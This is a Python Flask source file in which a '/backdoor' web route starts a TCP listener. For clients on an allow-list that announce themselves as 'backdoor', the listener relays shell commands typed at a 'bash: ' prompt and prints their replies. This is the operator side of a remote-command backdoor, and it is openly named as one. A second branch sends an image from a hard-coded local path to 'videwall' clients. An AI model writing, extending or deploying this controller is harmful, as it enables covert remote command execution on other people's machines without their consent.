import os
from flask import Flask, send_from_directory, render_template, redirect
import socket

import time
import tkinter as tk
from tkinter import Listbox, Entry, Button, Scrollbar


app = Flask(__name__)

port = int(os.environ.get("PORT", 5000))

def start_server():
    allowed_servers = ["127.0.0.1", "192.168.1.2"]
    server_host = '0.0.0.0'
    server_port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_host, server_port))
    server_socket.listen(5)  # Permite hasta 5 conexiones en espera

    print("Esperando conexiones en", server_host, ":", server_port)
    
    while True:
        client_socket, client_address = server_socket.accept()
        client_ip = client_address[0]
        print("waiting")
        time.sleep(1)
        if client_ip in allowed_servers:
            print("Cliente conectado:", client_address)
            client_type = client_socket.recv(1024).decode("utf-8")
            if client_type == "backdoor":
                print(client_type)
                client_socket.send("conectado".encode("utf-8"))
                command = ""
                while command != "quit()":
                    command = input("bash: ")
                    client_socket.send(command.encode("utf-8"))
                    response = client_socket.recv(1024).decode("utf-8")
                    print(response)
            elif client_type == "videwall":
                print(client_type)
                with open(r'C:\Users\diher\Documents\Desarrollo\Python Scripts\client-servidor\servidor\image.png', 'rb') as img_file:
                    image_data = img_file.read()

                client_socket.send(image_data)
                print("Imagen enviada al cliente:", client_address)
                client_socket.send(b"Welcome to the server!\n")
                client_socket.close()
            else:
                print("SOLO")
                print(client_type)
        else:
            print(f"Rejected connection from {client_ip}")
            client_socket.send(b"Unauthorized access!\n")
            client_socket.close()

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/')
def home():
   return render_template('index.html')

@app.route('/<path:path>')
def all_routes(path):
    return redirect('/')


@app.route('/backdoor')
def backdoor():
    start_server()


if __name__ == "__main__":
    app.run(port=port)
